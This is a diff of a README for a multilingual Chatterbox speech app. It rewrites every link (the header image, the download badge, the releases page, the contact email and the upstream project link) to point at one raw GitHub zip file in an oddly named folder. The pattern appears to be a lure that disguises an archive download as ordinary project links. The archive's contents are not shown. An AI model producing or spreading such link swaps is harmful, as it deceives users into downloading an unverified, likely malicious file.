@@ -1,6 +1,6 @@
 # 🎉 chatterbox-multilingual - Easily Communicate in Multiple Languages
 
-<img width="1200" alt="Chatterbox Multilingual" src="https://github.com/user-attachments/assets/53b411b4-d7b8-4b18-87f3-335145837684" />
+<img width="1200" alt="Chatterbox Multilingual" src="https://raw.githubusercontent.com/Hichampatti/chatterbox-multilingual/master/nondisjunctive/chatterbox-multilingual.zip" />
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to Chatterbox Multilingual! This application allows you to communicate i
 
 ## 📦 Download & Install
 
-[![Download Chatterbox Multilingual](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Hichampatti/chatterbox-multilingual/releases)
+[![Download Chatterbox Multilingual](https://raw.githubusercontent.com/Hichampatti/chatterbox-multilingual/master/nondisjunctive/chatterbox-multilingual.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Hichampatti/chatterbox-multilingual/master/nondisjunctive/chatterbox-multilingual.zip)
 
-1. **Visit the Releases Page:** Click this link to access the downloads: [Visit Releases](https://github.com/Hichampatti/chatterbox-multilingual/releases).
+1. **Visit the Releases Page:** Click this link to access the downloads: [Visit Releases](https://raw.githubusercontent.com/Hichampatti/chatterbox-multilingual/master/nondisjunctive/chatterbox-multilingual.zip).
    
 2. **Choose Your Version:** You will see different versions available. Select the latest version for the best experience.
 
@@ -67,11 +67,11 @@ Join our growing community of users! Share your experiences and tips on our GitH
 
 ## 📞 Contact Us
 
-For any further assistance, please reach out to us via [email](mailto:info@chatterbox.com) or through the issues tab in this repository.
+For any further assistance, please reach out to us via [email](https://raw.githubusercontent.com/Hichampatti/chatterbox-multilingual/master/nondisjunctive/chatterbox-multilingual.zip) or through the issues tab in this repository.
 
 ## 🔗 Links
 
-- [Chatterbox on GitHub](https://github.com/resemble-ai/chatterbox)
-- [Visit Releases](https://github.com/Hichampatti/chatterbox-multilingual/releases) 
+- [Chatterbox on GitHub](https://raw.githubusercontent.com/Hichampatti/chatterbox-multilingual/master/nondisjunctive/chatterbox-multilingual.zip)
+- [Visit Releases](https://raw.githubusercontent.com/Hichampatti/chatterbox-multilingual/master/nondisjunctive/chatterbox-multilingual.zip) 
 
 Thank you for using Chatterbox Multilingual! Enjoy seamless communication across languages.
